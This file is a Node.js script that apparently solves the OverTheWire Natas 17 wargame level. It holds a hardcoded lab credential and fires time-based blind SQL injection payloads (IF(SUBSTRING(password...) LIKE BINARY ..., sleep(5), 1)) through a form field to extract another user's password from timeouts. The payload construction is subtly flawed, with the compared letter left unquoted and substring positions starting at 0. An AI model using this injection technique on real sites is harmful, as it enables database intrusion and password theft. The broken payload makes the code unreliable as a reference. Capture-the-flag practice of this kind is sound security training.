var request = require('request');

// var test = "This user exists";
var natas17 = 'http://natas17.natas.labs.overthewire.org/';
var natas17user = 'natas17';
var natas17pass = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw';
var password = '';

var alphaNumeric = range('a', 'z').concat(range('A', 'Z'), range('0', '9'));

function range(start,stop) {
  var result=[];
  for (var idx=start.charCodeAt(0),end=stop.charCodeAt(0); idx <=end; ++idx){
    result.push(String.fromCharCode(idx));
  }
  return result;
}

function callback(character, error, response, body) {
  if (!error && response.statusCode == 200) {
    // console.log(response);
    // if (regx.test(body)) {
    //   password += letter;
    //   console.log(password);
    // }
  } else if (error) {
    if (error.code === 'ETIMEDOUT') {
      console.log(character);
    }
  }
}

function doRequest(pos, alphaChar) {
  // console.log('doRequest');
  var letter = alphaChar;
  var r = request.post(natas17, {
    timeout: 10000,
    auth: {
      'user': natas17user,
      'pass': natas17pass
    }
  }, callback.bind(this, letter));

// SELECT * from users where username="natas18" and if(substring(password,0,1) LIKE BINARY 'a', sleep(2), 1) #
  var form = r.form();
  form.append('debug', 'true');
  form.append('username', 'natas18" AND  IF(SUBSTRING(password, ' + pos + ', 1) LIKE BINARY' + letter + ',sleep(5),1) #');
}

function main() {
  for (var i=0, l=64; i<l; i+=1) {
    for (var j=0, alpha=alphaNumeric.length; j<alpha; j+=1) {
      doRequest(i, alphaNumeric[j]);
    }
  }
}
main();
